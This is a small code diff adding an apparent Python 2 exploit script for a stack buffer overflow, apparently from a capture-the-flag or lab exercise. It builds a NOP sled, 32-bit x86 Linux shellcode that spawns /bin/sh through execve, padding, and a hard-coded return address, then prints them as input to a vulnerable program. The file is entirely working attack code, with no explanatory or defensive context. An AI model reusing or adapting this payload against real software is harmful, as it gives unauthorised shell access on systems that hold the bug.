@@ -1,0 +1,10 @@
+
+nop_in = "\x90"*0x1f4;
+shellcode = "\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x99\x52\x53\x89\xe1\xb0\x0b\xcd\x80";
+nop_out = "\x90"*0xdf3;
+offset = "\x90"*9;
+address = "\x70\xc6\xff\xff";
+filler = "\x90"*7
+
+print nop_in + shellcode + nop_out;
+print offset + address + filler;
